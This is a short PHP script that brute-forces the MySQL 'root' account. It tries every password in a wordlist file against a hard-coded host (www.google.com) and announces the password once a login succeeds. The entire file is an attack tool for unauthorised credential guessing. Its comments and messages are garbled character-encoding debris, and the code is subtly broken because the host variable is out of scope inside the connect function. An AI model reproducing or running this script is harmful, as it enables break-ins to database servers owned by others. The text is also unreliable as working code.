<?
set_time_limit(0);                                   //�}�����W��

$ip = "www.google.com";                                   //IP
$user = "root";                                      //�Τ�W
$passwd = file("password.txt");                      //�K�X�r��

for($i=0; $i<count($passwd); $i++){
    $pass = Str_Replace("\r\n", "", $passwd[$i]);   //�R���h�l��Enter�M����
    connect($user, $pass);
    flush();
}
echo "���y�����I";

function connect($user, $pass) {
    if(@mysql_connect($ip, $user, $pass)){
        echo "<font color='#0000FF'><b>�o��K�X�G<font color='#FF0000'>".$pass."</font>�I�I�I</b></font>";
        exit();
    }
    else {
        echo $pass.'<br>';
    }
}
?>